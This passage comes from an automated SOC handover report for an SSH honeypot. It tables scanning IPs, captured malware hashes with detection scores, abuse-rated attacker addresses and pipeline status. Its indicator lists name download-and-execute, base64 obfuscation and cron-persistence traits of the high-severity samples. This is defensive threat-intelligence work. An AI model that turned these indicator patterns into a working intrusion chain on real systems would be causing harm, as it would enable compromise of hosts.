| `139.199.80[.]137` | **4** | 2026-08-10 09:13 | 2026-08-10 10:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]73` | **4** | 2026-08-10 10:50 | 2026-08-10 10:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-10 10:27 | 2026-08-10 10:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-10 10:10 | 2026-08-10 10:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]183` | **3** | 2026-08-10 10:51 | 2026-08-10 10:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]125` | **3** | 2026-08-10 10:52 | 2026-08-10 10:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]35` | **3** | 2026-08-10 10:51 | 2026-08-10 10:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-08-10 09:01 | 2026-08-10 09:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **3** | 2026-08-10 09:13 | 2026-08-10 10:30 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-08-10 09:39 | 2026-08-10 10:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.235.40[.]131` | **2** | 2026-08-10 10:07 | 2026-08-10 10:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `60.171.24[.]134` | **2** | 2026-08-10 10:09 | 2026-08-10 10:11 | 2m | 0 | `T1592` | 🟢 LOW |
| `121.40.20[.]65` | 1 | 2026-08-10 10:52 | 2026-08-10 10:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]106` | 1 | 2026-08-10 10:47 | 2026-08-10 10:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-08-10 09:54 | 2026-08-10 09:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `155.4.209[.]51` | 1 | 2026-08-10 10:12 | 2026-08-10 10:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]211` | 1 | 2026-08-10 10:50 | 2026-08-10 10:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.12.98[.]252` | 1 | 2026-08-10 10:13 | 2026-08-10 10:13 | 11s | 0 | `T1592` | 🟢 LOW |
| `27.223.98[.]117` | 1 | 2026-08-10 09:45 | 2026-08-10 09:45 | 14s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-08-10 10:47 | 2026-08-10 10:48 | 40s | 0 | `T1592` | 🟢 LOW |
| `37.53.166[.]25` | 1 | 2026-08-10 10:54 | 2026-08-10 10:54 | 19s | 0 | `T1592` | 🟢 LOW |
| `38.51.234[.]40` | 1 | 2026-08-10 10:23 | 2026-08-10 10:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-08-10 10:05 | 2026-08-10 10:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-08-10 10:35 | 2026-08-10 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]251` | 1 | 2026-08-10 10:25 | 2026-08-10 10:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.201.82[.]57` | 1 | 2026-08-10 10:02 | 2026-08-10 10:03 | 15s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]42` | 1 | 2026-08-10 08:59 | 2026-08-10 09:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]3` | 1 | 2026-08-10 10:20 | 2026-08-10 10:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.154.184[.]166` | 1 | 2026-08-10 10:04 | 2026-08-10 10:04 | 11s | 0 | `T1592` | 🟢 LOW |
| `83.191.181[.]23` | 1 | 2026-08-10 10:12 | 2026-08-10 10:14 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `140.245.50[.]204` | SG | Oracle Corporation | **100** ⚠️ | 1 |
| `91.233.83[.]203` | GB | Andrew Millar Ltd | **100** ⚠️ | 10 |
| `37.53.166[.]25` | UA | JSC Ukrtelecom | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `38.51.234[.]40` | CO | SP SISTEMAS PALACIOS | **100** ⚠️ | 2 |
| `111.70.14[.]135` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `146.56.164[.]20` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 2 |
| `59.48.39[.]222` | CN | CHINANET Shanxi province network | **100** ⚠️ | 50 |
| `66.132.172[.]183` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `122.160.187[.]31` | IN | ABTS DELHI, | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 41 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 191 cases |
| Tool 34  | Credential Extractor        | ✅ 50 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (16.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 55 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 41 priority case(s) shown individually · 33 recon entry/entries in table (15 group(s) consolidating 100 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-10T11:12:29Z_
